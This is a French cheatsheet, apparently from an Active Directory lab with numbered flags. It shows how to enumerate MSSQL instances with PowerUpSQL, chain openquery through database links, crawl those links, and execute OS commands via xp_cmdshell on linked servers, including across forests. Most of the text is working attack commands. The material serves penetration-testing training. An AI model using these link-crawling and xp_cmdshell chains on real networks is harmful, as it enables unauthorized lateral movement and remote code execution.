# Cheatsheet - MSSQL et PowerUpSQL

> [!summary] Objectif
> Découvrir les instances SQL du domaine puis crawler les *database links* — un lien SQL mal cloisonné peut chaîner l'exécution de commandes d'un serveur à l'autre, y compris cross-forest.

> [!warning]- Required
> Un compte de domaine dont l'authentification Windows est acceptée par au moins une instance SQL de la chaîne (souvent le cas par défaut) — pas besoin d'un login SQL dédié.

> [!abstract] Pourquoi · Chaînage
> **Repérer** les database links entre serveurs = flag · **Exploiter** = crawler les links → `xp_cmdshell` → exec d'un serveur à l'autre (même cross-forest).
> **Prérequis** un compte de domaine accepté par une instance → **débloque** exec sur les serveurs liés.

### Discover SQL instances

```powershell
Import-Module C:\AD\Tools\PowerUpSQLmaster\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

### Read database links manually

```sql
select * from master..sysservers
select srvname, isremote from master..sysservers          -- format court pour flag F37 (1er srvname avec isremote=1)
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
select * from openquery("DCORP-SQL1",'select * from openquery("DCORPMGMT",''select * from master..sysservers'')')
select * from openquery("DCORP-SQL1",'select system_user')  -- login SQL utilisé par le lien sortant (flag F38)
```

Ces requêtes imbriquées montrent le chaînage `DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT` — c'est exactement ce que `Get-SQLServerLinkCrawl` automatise ensuite.

### Crawl automatically and execute

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version'
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "select system_user"                     # login SQL courant côté link (F38)
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <target>
```

Commencer par une requête de lecture (`SELECT @@version`) avant `xp_cmdshell` pour confirmer la portée réelle de la chaîne sans déclencher d'exécution.

### Privilèges SQL en bout de chaîne (F39, cross-forest)

```powershell
# Check sysadmin rapide (1/0)
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "SELECT IS_SRVROLEMEMBER('sysadmin')" -QueryTarget eu-sql
# Lister tous les rôles serveur possédés par le login effectif
Get-SQLServerLinkCrawl -Instance dcorp-mssql `
  -Query "SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER(name, SUSER_NAME()) = 1" `
  -QueryTarget eu-sql
```

**Link**
- [[Synthèse - MSSQL]]
- [[Cheatsheet - Trusts et forêts]]
- [[Cheatsheet - PowerShell]]
